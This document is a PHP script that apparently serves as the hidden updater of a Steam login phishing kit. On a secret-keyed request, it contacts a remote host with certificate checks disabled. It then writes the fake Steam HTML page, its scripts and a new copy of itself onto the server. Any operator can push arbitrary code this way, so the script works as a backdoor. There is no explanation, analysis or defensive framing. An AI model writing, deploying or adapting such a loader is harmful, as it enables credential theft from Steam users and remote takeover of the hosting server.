<?php

$phpName = "deab0093a0f4551414b49ba57151ae08.php";
$steamHtmlName = "6kaomrcjpf2m.html";
$steamScriptName = "bhcg4ddaadpt.js";
$windowScriptName = "ocbp8i7rp6hv.js";
$domainToLogin = "oldwwweeeewee.com";
$resourceUrl = "https://oldwwweeeewee.com/fa3436t20izhvt8a9hlb4aubmyie2l4k6clds";
$postData = [
    "secret" => "9871633e20ecabe626b91816ea044bb7",
    "authBtnClass" => "e8gyjt8s0qog",
    "steamHtmlName" => $steamHtmlName,
    "steamScriptName" => $steamScriptName,
    "windowScriptName" => $windowScriptName,
];
$buildId = "483a6dec-15ef-43f7-a9df-80ac4d102086";
$version = "2";


$update = isset($_GET['update']) && $_GET['update'] === 'true';
$secret = isset($_GET['secret']) ?$_GET["secret"] : null;

if($secret !== $postData["secret"]){
	echo "false";
} else if($update) {
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, $resourceUrl);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

	$response = curl_exec($ch);

	if(curl_errno($ch)) {
		echo '\nError:' . curl_error($ch);
	} else if(!is_writable($windowScriptName)){
        echo "\nDirectory is unvailable for writting: " . $windowScriptName;
   } else {
		$responseData = json_decode($response, true);

		if (isset($responseData['windowScript'])) {
			$result = file_put_contents($windowScriptName, $responseData["windowScript"]);

			if($result === false) {
				echo "\nFailed to write window script\n";
			}
		}

		if (isset($responseData['steamScript'])) {
			$result = file_put_contents($steamScriptName, $responseData["steamScript"]);

			if($result === false) {
				echo "\nFailed to write steam script\n";
			}
		}

		if (isset($responseData['steamFile'])) {
			$result = file_put_contents($steamHtmlName, $responseData["steamFile"]);

			if($result === false) {
				echo "\nFailed to write steam file\n";
			}
		}

		if (isset($responseData['updatePhp'])) {
			$result = file_put_contents($phpName, $responseData["updatePhp"]);

			if($result === false) {
				echo "\nFailed to write update php file\n";
			}
		}

		echo "success";
	}

	curl_close($ch);
} else {
	header('Content-Type: application/json');

	echo json_encode([
		"success" => true,
		"buildId" => $buildId,
		"version" => $version
	]);
}

?>